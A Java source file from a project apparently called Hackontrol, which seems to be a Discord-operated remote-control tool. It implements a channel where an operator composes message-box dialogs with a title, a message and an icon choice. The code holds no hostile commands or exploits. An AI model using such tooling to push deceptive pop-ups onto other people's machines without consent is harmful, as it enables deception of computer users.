package com.khopan.hackontrol.channel;

import com.khopan.hackontrol.HackontrolChannel;
import com.khopan.hackontrol.manager.interaction.ButtonContext;
import com.khopan.hackontrol.manager.interaction.ButtonManager;
import com.khopan.hackontrol.manager.interaction.ButtonManager.ButtonType;
import com.khopan.hackontrol.manager.interaction.InteractionManager;
import com.khopan.hackontrol.manager.interaction.ModalManager;
import com.khopan.hackontrol.manager.interaction.StringSelectManager;
import com.khopan.hackontrol.registry.Registry;
import com.khopan.hackontrol.utils.interaction.HackontrolButton;
import com.khopan.hackontrol.utils.interaction.HackontrolStringSelectMenu;

import net.dv8tion.jda.api.interactions.callbacks.IModalCallback;
import net.dv8tion.jda.api.interactions.components.ActionRow;
import net.dv8tion.jda.api.interactions.components.buttons.Button;
import net.dv8tion.jda.api.interactions.components.selections.StringSelectMenu;
import net.dv8tion.jda.api.interactions.components.text.TextInput;
import net.dv8tion.jda.api.interactions.components.text.TextInputStyle;

public class DialogChannel extends HackontrolChannel {
	private static final String CHANNEL_NAME = "dialog";

	private static Button BUTTON_NEW_DIALOG = ButtonManager.staticButton(ButtonType.SUCCESS, "New Dialog", "newDialog");

	@Override
	public String getName() {
		return DialogChannel.CHANNEL_NAME;
	}

	@Override
	public void preInitialize(Registry registry) {
		registry.register(InteractionManager.BUTTON_REGISTRY, DialogChannel.BUTTON_NEW_DIALOG, this :: buttonNewDialog);
	}

	@Override
	public void initialize() {
		this.channel.sendMessageComponents(ActionRow.of(DialogChannel.BUTTON_NEW_DIALOG)).queue();
	}

	private void buttonNewDialog(ButtonContext context) {
		this.replNewEditDialogModal(context, false, null, null);
	}

	private void replNewEditDialogModal(IModalCallback callback, boolean edit, String title, String messageContent) {
		TextInput titleInput = TextInput.create("title", "Title", TextInputStyle.SHORT)
				.setMinLength(-1)
				.setMaxLength(-1)
				.setRequired(false)
				.setPlaceholder("Error")
				.setValue(title)
				.build();

		TextInput messageInput = TextInput.create("message", "Message", TextInputStyle.PARAGRAPH)
				.setMinLength(-1)
				.setMaxLength(-1)
				.setRequired(false)
				.setPlaceholder("Type a message...")
				.setValue(messageContent)
				.build();

		callback.replyModal(ModalManager.dynamicModal(edit ? "Edit Dialog" : "New Dialog", context -> {
			DialogInstance instance = new DialogInstance();
			instance.title = context.getValue("title").getAsString();
			instance.message = context.getValue("message").getAsString();
			StringSelectMenu menu = StringSelectManager.dynamicMenu(HackontrolStringSelectMenu :: saveDefault)
					.addOption("Icon Information", "iconInformation", "An icon consisting of a lowercase letter i in a circle appears in the message box.")
					.addOption("Icon Question", "iconQuestion", "A question-mark icon appears in the message box.")
					.addOption("Icon Warning", "iconWarning", "An exclamation-point icon appears in the message box.")
					.addOption("Icon Error", "iconError", "A stop-sign icon appears in the message box.")
					.setMaxValues(1)
					.build();

			context.reply(instance.toString()).addActionRow(menu).addActionRow(HackontrolButton.delete()).queue(InteractionManager :: callback);
		}).addActionRow(titleInput).addActionRow(messageInput).build()).queue();
	}

	private class DialogInstance {
		private String title;
		private String message;

		@Override
		public String toString() {
			StringBuilder builder = new StringBuilder();

			if(this.title != null && !this.title.isEmpty()) {
				builder.append("**Title**\n");
				builder.append(this.title);
			}

			if(this.message != null && !this.message.isEmpty()) {
				builder.append("\n\n**Message**\n");
				builder.append(this.message);
			}

			return builder.toString().trim();
		}
	}
}
